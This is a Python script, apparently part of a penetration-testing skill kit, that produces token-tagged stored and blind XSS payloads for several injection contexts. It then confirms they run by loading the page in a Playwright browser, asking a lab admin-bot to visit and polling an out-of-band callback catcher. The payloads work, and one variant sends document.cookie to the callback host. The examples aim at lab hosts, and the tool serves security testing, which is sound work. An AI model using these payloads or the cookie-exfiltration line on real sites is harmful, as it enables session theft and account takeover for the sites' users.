#!/usr/bin/env python3
"""Stored/blind XSS proof: unique token per injection point, browser execution or OAST hit.

  token   mint a token for one injection point, append it to the token map, print payloads that
          carry it (dialog + console canary + OAST callback). Inject one of them yourself as user A.
  verify  open the render page in a fresh Playwright context (another role's storage_state),
          listen for a dialog / console message carrying the token, screenshot; optionally ask the
          lab admin-bot to visit, then poll the lab OAST catcher or an interactsh-client -json log.

  scripts/mythos python3 skills/stored-xss-oast/scripts/xss_verify.py token --map engagements/<dir>/scan/xss-tokens.jsonl \
      --point 'POST /api/comments body.text' --oast http://oast:8080
  scripts/mythos python3 skills/stored-xss-oast/scripts/xss_verify.py verify --token mx1a2b3c4d \
      --url http://vuln-bank-web:5000/comments --state engagements/<dir>/sessions/userB.state.json \
      --admin-bot http://admin-bot:8000 --oast http://oast:8080 --shot engagements/<dir>/scan/xss-mx1a2b3c4d.png

Verdict: validated only if the canary fired in the browser or the OAST log holds this token.
"""
import argparse, json, os, secrets, sys, time, urllib.request
from pathlib import Path


def payloads(t, oast):
    js = f"console.log('MYTHOS-XSS:{t}');alert('MYTHOS-XSS:{t}')"
    if oast:
        js += f";new Image().src='{oast.rstrip('/')}/{t}?c='+encodeURIComponent(document.cookie)"
    return [f'<img src=x onerror="{js}">',
            f'"><svg onload="{js}">',
            f"<script>{js}</script>",
            f"'-{js}-'",  # inside a JS string context
            f"javascript:{js}"]  # href / src sinks


def cmd_token(a):
    t = "mx" + secrets.token_hex(4)
    rec = {"token": t, "point": a.point, "ts": time.strftime("%Y-%m-%dT%H:%M:%S"), "payloads": payloads(t, a.oast)}
    with open(a.map, "a") as f:
        f.write(json.dumps(rec) + "\n")
    print(json.dumps(rec, indent=1))
    return 0


def browser(a, t):
    from playwright.sync_api import sync_playwright
    hits = []
    with sync_playwright() as p:
        exe = os.environ.get("CHROME_BIN")
        b = p.chromium.launch(executable_path=exe, args=["--no-sandbox"]) if exe else p.chromium.launch()
        ctx = b.new_context(storage_state=a.state, ignore_https_errors=True) if a.state else \
            b.new_context(ignore_https_errors=True)
        page = ctx.new_page()

        def on_dialog(d):
            if t in d.message:
                hits.append({"type": "dialog", "message": d.message})
            d.accept()
        page.on("dialog", on_dialog)
        page.on("console", lambda m: hits.append({"type": "console", "text": m.text}) if t in m.text else None)
        page.goto(a.url, wait_until="networkidle", timeout=30000)
        page.wait_for_timeout(a.wait * 1000)
        if a.shot:
            page.screenshot(path=a.shot, full_page=True)
        b.close()
    return hits


def post_json(url, body):
    req = urllib.request.Request(url, json.dumps(body).encode(), {"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=60) as r:
        return r.status, r.read(300).decode(errors="replace")


def oast_hits(a, t):
    lines = []
    if a.oast:
        with urllib.request.urlopen(a.oast.rstrip("/") + "/__log", timeout=15) as r:
            lines += r.read().decode(errors="replace").splitlines()
    if a.interactsh_log and Path(a.interactsh_log).exists():
        lines += Path(a.interactsh_log).read_text(errors="replace").splitlines()
    return [json.loads(l) if l.startswith("{") else l for l in lines if t.lower() in l.lower()]


def cmd_verify(a):
    t, res = a.token, {"token": a.token, "url": a.url}
    if not a.no_browser:
        res["browser"] = browser(a, t)
        res["screenshot"] = a.shot
    if a.admin_bot:
        try:
            res["admin_bot"] = post_json(a.admin_bot.rstrip("/") + "/visit", {"url": a.url})
        except OSError as e:
            res["admin_bot"] = f"error: {e}"
    res["oast"] = []
    if a.oast or a.interactsh_log:
        deadline = time.time() + a.poll
        while True:
            res["oast"] = oast_hits(a, t)
            if res["oast"] or time.time() >= deadline:
                break
            time.sleep(3)
    res["verdict"] = "validated" if res.get("browser") or res["oast"] else "unconfirmed"
    print(json.dumps(res, indent=1))
    return 0 if res["verdict"] == "validated" else 1


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="cmd", required=True)
    k = sub.add_parser("token")
    k.add_argument("--map", required=True, help="token map JSONL (token -> injection point)")
    k.add_argument("--point", required=True, help='where it goes, e.g. "POST /api/profile body.bio"')
    k.add_argument("--oast", help="callback base, e.g. http://oast:8080 or http://<id>.oast.fun")
    v = sub.add_parser("verify")
    v.add_argument("--token", required=True)
    v.add_argument("--url", required=True, help="page where the stored payload renders")
    v.add_argument("--state", help="storage_state of the viewing role (not the injecting one)")
    v.add_argument("--no-browser", action="store_true", help="blind XSS: rely on admin-bot + OAST only")
    v.add_argument("--wait", type=int, default=3, help="seconds to wait after load")
    v.add_argument("--shot", help="screenshot path")
    v.add_argument("--admin-bot", help="lab admin-bot base, e.g. http://admin-bot:8000")
    v.add_argument("--oast", help="lab catcher base; its /__log is searched for the token")
    v.add_argument("--interactsh-log", help="file written by: interactsh-client -json -o FILE")
    v.add_argument("--poll", type=int, default=30, help="seconds to poll OAST")
    a = ap.parse_args()
    return cmd_token(a) if a.cmd == "token" else cmd_verify(a)


if __name__ == "__main__":
    sys.exit(main())
